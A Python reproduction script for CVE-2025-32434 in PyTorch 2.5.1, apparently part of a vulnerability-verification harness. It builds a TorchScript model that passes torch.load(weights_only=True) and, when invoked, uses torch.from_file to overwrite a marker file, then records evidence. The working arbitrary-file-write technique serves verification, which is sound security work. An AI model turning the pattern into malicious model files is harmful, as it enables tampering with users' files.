"""CVE-2025-32434 dynamic reproduction (PyTorch 2.5.1+cpu).

Public PoC: a TorchScript module is accepted by ``torch.load(...,
weights_only=True)``; invoking the loaded module executes its forward graph.
The graph uses ``torch.from_file(..., shared=True)`` to map and overwrite an
arbitrary file.  This is a model-execution primitive rather than load-time
unpickling; the distinction matters and is recorded in the evidence.

Requires the CPU-only PyTorch 2.5.1 venv (no GPU).
"""

from __future__ import annotations

import json
import os
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import poclib  # noqa: E402


def main() -> None:
    import torch

    if not torch.__version__.startswith("2.5.1"):
        poclib.fail(f"unexpected torch version {torch.__version__}; this case is pinned to 2.5.1")

    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    text = poclib.MARKER_TEXT
    marker = str(poclib.MARKER_FILE).replace("\\", "/")
    marker_rel = poclib.rel(poclib.MARKER_FILE)
    poclib.start_marker("PRE\n")
    model_path = poclib.EVIDENCE_DIR / "scriptmodule.pt"

    class MarkerModule(torch.nn.Module):
        def forward(self, x: torch.Tensor, path: str, data: torch.Tensor):
            mapped = torch.from_file(path, shared=True, size=data.numel(), dtype=torch.uint8)
            mapped.copy_(data)
            out = x * 2.0
            out = out + mapped.sum().to(out.dtype) * 0.0
            return out

    module = torch.jit.script(MarkerModule())
    module.save(str(model_path))
    loaded = torch.load(str(model_path), weights_only=True)
    loaded(
        torch.tensor([10], dtype=torch.uint8),
        marker,
        torch.tensor(list(text.encode("utf-8")), dtype=torch.uint8),
    )

    if not poclib.marker_ok():
        poclib.fail("loaded TorchScript module did not overwrite the marker file")

    poclib.finish_verified(
        {
            "transport": {
                "type": "function+torch.jit",
                "entrypoint": "torch.load(weights_only=True) -> ScriptModule.forward -> torch.from_file(shared=True)",
                "torch_version": torch.__version__,
                "model": poclib.rel(model_path),
                "model_sha256": poclib.sha256_file(model_path),
                "marker_path": marker_rel,
                "public_poc": "https://github.com/cyhe50/cve-2025-32434-poc (write_to_testtxt.py pattern)",
                "scope_note": "arbitrary file write occurs when the loaded model is invoked, not during load itself",
            },
            "request_response": [
                {
                    "step": "torch.save(scripted module, legacy zip)",
                    "step2": "torch.load(path, weights_only=True)",
                    "step3": "module(x, marker_path)",
                    "result": "torch.from_file mapped marker and copy_ wrote proof text",
                }
            ],
            "state_before": "marker=PRE",
            "state_after": "marker contains proof text",
        }
    )


if __name__ == "__main__":
    main()
